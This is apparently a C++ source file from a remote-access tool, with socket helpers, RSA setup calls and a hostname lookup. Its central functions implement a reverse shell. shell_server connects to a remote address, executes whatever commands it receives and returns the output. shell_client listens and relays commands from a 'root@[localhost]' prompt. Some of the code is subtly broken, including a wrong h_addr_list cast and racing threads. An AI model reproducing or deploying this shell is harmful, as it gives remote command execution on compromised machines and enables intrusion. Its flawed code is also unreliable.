#import "libs/utilites.h"
#import "libs/netAPI.h"
#import "libs/RSA.h"

struct net_shell {
    char buffer[102400];
} __attribute__ ((packed));

SPtr<utilites> utils;
SPtr<net>      net_a;

core::int32_t sock, bytes_read, listener;

int net::init(core::int32_t part, sockaddr_in addr) {
    if (sock < 0)  return SOCKET_ERROR;
    switch (part) {
        case CLIENT:
            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) return CONNECTION_REFUSED;
            else { RSA_Initialization(); return OK; }
        case SERVER:
            if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) return BINDING_NET_ERROR;
            else { RSA_Initialization(); return OK; }
        default:
            std::cout << "[*]Part didn't init...";
            return GENERAL_ERROR;
    }
}

void net::init_socket(sockaddr_in *addr, core::int8_t *ip, core::int32_t port) {
    sock = socket(AF, TCP, 0);
    addr -> sin_addr.s_addr = inet_addr(ip);
    addr -> sin_port = htons(port);
    addr -> sin_family = AF;
}

void net::_recv(sockaddr_in addr, void *ptr, sockaddr *recv_addr = NULL, socklen_t *size_recv_addr = NULL) {
    if (net_a.memory()->init(SERVER, addr) != OK) { std::cout << "[!]Initialization error..."; exit(INIT_ERROR); }
    listen(sock, 1024);
    listener = accept(sock, recv_addr, size_recv_addr);
    if (listener <= 0) { std::cout << "[!]Accept error..."; exit(ACCEPT_LISTENER_ERROR); }
    recv(listener, ptr, 1024, 0);
}

void net::_recv_loop(sockaddr_in addr, void *ptr, sockaddr *recv_addr = NULL, socklen_t *size_recv_addr = NULL) {
    listen(sock, 1024);
    listener = accept(sock, recv_addr, size_recv_addr);
    if (listener <= 0) { std::cout << "[!]Accept error..."; exit(ACCEPT_LISTENER_ERROR); }
    recv(listener, ptr, 1024, 0);
}

void net::_send(sockaddr_in addr, void *buffer, size_t size) {
    if (net_a.memory()->init(CLIENT, addr) != OK) exit(INIT_ERROR);
    send(sock, buffer, size, 0);
}

void net::shell_client(sockaddr_in addr, core::int32_t type) {
    if (net_a.memory()->init(SERVER, addr) != OK) exit(INIT_ERROR);

    struct net_shell shell;
    std::string shell1;
    std::string buffer_s;
    SPtr<char> buffer_c(102400);
    SPtr<long long> Ciphertext(102400);

    while (1) {
        listen(sock, 1024);
        listener = accept(sock, NULL, NULL);
        if (listener <= 0) exit(ACCEPT_LISTENER_ERROR);

        while (1) {
            buffer_s = utils.memory() -> cmd("root@[localhost]~:$ ", shell1);
            switch (type) {
                case BUFFER:
                    bzero(buffer_c.memory(), buffer_c.size());
                    memcpy(buffer_c.memory(), buffer_s.c_str(), strlen(buffer_s.c_str()));

                    send(listener, buffer_c.memory(), buffer_c.size(), 0);

                    std::thread([&]() {
                        bytes_read = recv(listener, buffer_c.memory(), 102400, 0);
                        for (int i = 0; i < strlen(buffer_c.memory()); i++)
                            std::cout << buffer_c[i];
                    }).detach();

                    std::this_thread::sleep_for(std::chrono::milliseconds(300));
                    break;
                default:
                    std::cout << "[*]Type of data doesn't support...";
                    exit(GENERAL_ERROR);
            } if (bytes_read <= 0) break;
        }
    }
}

void net::shell_server(sockaddr_in addr, core::int32_t type) {
    if (net_a.memory()->init(CLIENT, addr) != OK) exit(INIT_ERROR);

    struct net_shell shell;
    std::string result;
    SPtr<char> buffer(102400);
    SPtr<long long> Ciphertext(102400);

    while (1) {
        switch (type) {
            case BUFFER:
                bzero(buffer.memory(), buffer.size());

                bytes_read = recv(sock, buffer.memory(), 102400, 0);
                result = utils.memory() -> exec(buffer.memory());

                send(sock, result.c_str(), strlen(result.c_str()), 0);
                break;
            default:
                exit(GENERAL_ERROR);
        }
        if (bytes_read <= 0) break;
    }
    close(sock);
}
// HTTP
void net::getserviceaddr(int argc, char **argv) {
    struct hostent *host_info;
    struct in_addr *address;

    if (argc < 2) exit(HTTP_H_ERROR);

    host_info = gethostbyname(argv[1]);
    if (host_info == NULL) std::cout << "[!]Didn't found " << argv[1] << std::endl;
    else {
        address = (struct in_addr *)(host_info -> h_addr_list);
        std::cout << argv[1] << " has address " << inet_ntoa(*address) << std::endl;
    }
}
